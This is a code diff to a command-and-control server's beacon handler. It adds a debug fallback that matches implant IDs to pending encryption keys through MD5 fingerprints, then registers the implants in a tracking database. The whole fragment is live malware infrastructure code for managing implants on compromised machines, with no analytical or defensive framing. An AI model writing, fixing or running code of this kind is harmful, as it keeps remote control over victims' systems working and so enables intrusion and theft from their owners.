@@ -524,7 +524,31 @@ def beacon_handler():
         
         key = get_session_key(implant_id)
         if not key:
-            return jsonify({'error': 'No session key'}), 401
+            print(f"[DEBUG] No session key for implant_id: {implant_id}")
+            print(f"[DEBUG] pending_keys count: {len(pending_keys)}")
+            # Try to find key in pending_keys by checking all fingerprints
+            for fp, (pending_key, timestamp) in pending_keys.items():
+                # Check if this implant_id could be derived from fingerprint
+                import hashlib
+                possible_hash = hashlib.md5(fp.encode()).hexdigest()[:8]
+                print(f"[DEBUG] Checking fp: {fp[:16]}..., possible_hash: {possible_hash}, matches? {possible_hash == implant_id}")
+                if possible_hash == implant_id:
+                    print(f"[DEBUG] MATCH FOUND! Using key from fingerprint: {fp[:16]}...")
+                    key = pending_key
+                    # Store it in database for future use
+                    conn = sqlite3.connect(DB_PATH)
+                    c = conn.cursor()
+                    c.execute('INSERT OR REPLACE INTO implants (implant_id, implant_hash, session_key, first_seen, last_beacon, beacon_count) VALUES (?, ?, ?, datetime("now"), datetime("now"), 1)',
+                              (implant_id, fp[:16], base64.b64encode(key).decode()))
+                    conn.commit()
+                    conn.close()
+                    session_keys[implant_id] = key
+                    print(f"[DEBUG] Created database entry for implant_id: {implant_id}")
+                    break
+            
+            if not key:
+                print(f"[DEBUG] No matching fingerprint found for implant_id: {implant_id}")
+                return jsonify({'error': 'No session key'}), 401
         
         f = Fernet(key)
         try:
